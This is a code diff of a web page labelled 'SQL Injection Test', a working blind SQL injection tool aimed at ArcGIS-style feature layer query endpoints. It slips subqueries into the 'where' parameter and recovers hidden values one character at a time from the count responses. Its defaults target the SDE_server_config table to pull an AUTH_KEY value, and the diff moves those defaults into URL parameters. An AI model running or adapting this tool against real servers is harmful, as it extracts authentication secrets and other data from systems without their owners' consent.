@@ -11,16 +11,16 @@
     <div class="container">
         <h3>SQL Injection Test</h3>
         <div class="form-group">
-            <input type="url" class="form-control" id="txtUrl" placeholder="Feature Layer Url (i.e. /MapServer/0)" value="" />
+            <input type="url" class="form-control" id="txtUrl" placeholder="Feature Layer Url (i.e. /MapServer/0)" />
         </div>
         <div class="form-group">
-            <input type="text" class="form-control" id="txtTable" placeholder="Table Name (i.e. GDB_ITEMS)" value="SDE_server_config" />
+            <input type="text" class="form-control" id="txtTable" placeholder="Table Name (i.e. GDB_ITEMS)" />
         </div>
         <div class="form-group">
-            <input type="text" class="form-control" id="txtField" placeholder="Field Name (i.e. PhysicalName)" value="char_prop_value" />
+            <input type="text" class="form-control" id="txtField" placeholder="Field Name (i.e. PhysicalName)" />
         </div>
         <div class="form-group">
-            <input type="text" class="form-control" id="txtWhereClause" placeholder="Where Clause (Optional)" value="prop_name='AUTH_KEY'" />
+            <input type="text" class="form-control" id="txtWhere" placeholder="Where  (Optional)" />
         </div>
         <button type="button" class="btn btn-default pull-right" id="btnStart">Start</button>
     </div>
@@ -29,7 +29,7 @@
         <div id="txtResult" class="alert alert-success"></div>
     </div>
     <script>
-        var url, table, field, whereClause, stopped;
+        var url, table, field, where, stopped;
         var chars = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', ' ', '!', '\"', '#', '$', '%', '&', '\'', '(', ')', '*', '+', ',', '-', '.', '/', ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '_', '{', '|', '}', '~'];
         function param(s) {
             var m = window.location.href.match(new RegExp("[\?&]" + s + "=([^&#]*)"));
@@ -37,13 +37,16 @@
         }
         $(document).ready(function () {
             $("#txtUrl").val(param("url"));
+            $("#txtTable").val(param("table") || "SDE_server_config");
+            $("#txtField").val(param("field") || "char_prop_value");
+            $("#txtWhere").val(param("where") || "prop_name='AUTH_KEY'");
             $("#txtTemp").hide();
             $("#txtResult").hide();
             $("#btnStart").click(function () {
                 url = $("#txtUrl").val();
                 table = $("#txtTable").val();
                 field = $("#txtField").val();
-                whereClause = $("#txtWhereClause").val() || "0=0";
+                where = $("#txtWhere").val() || "0=0";
                 if (url && table && field) {
                     $("#txtResult").text("").hide();
                     stopped = false;
@@ -59,7 +62,7 @@
             $.each(chars, function (_, c) {
                 var value = seed + c;
                 $.ajax({
-                    url: url + "/query?where=" + encodeURIComponent("(SELECT COUNT(" + field + ") FROM " + table + " WHERE UPPER(" + field + ") LIKE '" + value.replace(/\%/g, "[%]").replace(/_/g, "[_]").replace(/'/g, "''") + "%' AND (" + whereClause + "))>0") + "&returnCountOnly=true&f=json",
+                    url: url + "/query?where=" + encodeURIComponent("(SELECT COUNT(" + field + ") FROM " + table + " WHERE UPPER(" + field + ") LIKE '" + value.replace(/\%/g, "[%]").replace(/_/g, "[_]").replace(/'/g, "''") + "%' AND (" + where + "))>0") + "&returnCountOnly=true&f=json",
                     dataType: "jsonp",
                     success: function (data) {
                         if (data.error && data.error.message) {
@@ -79,7 +82,7 @@
             if (stopped) return;
             $("input, button").prop("disabled", true);
             $.ajax({
-                url: url + "/query?where=" + encodeURIComponent("(SELECT COUNT(" + field + ") FROM " + table + " WHERE UPPER(" + field + ") = '" + text.replace(/'/g, "''") + "' AND (" + whereClause + "))>0") + "&returnCountOnly=true&f=json",
+                url: url + "/query?where=" + encodeURIComponent("(SELECT COUNT(" + field + ") FROM " + table + " WHERE UPPER(" + field + ") = '" + text.replace(/'/g, "''") + "' AND (" + where + "))>0") + "&returnCountOnly=true&f=json",
                 dataType: "jsonp",
                 success: function (data) {
                     if (data.count > 0) {
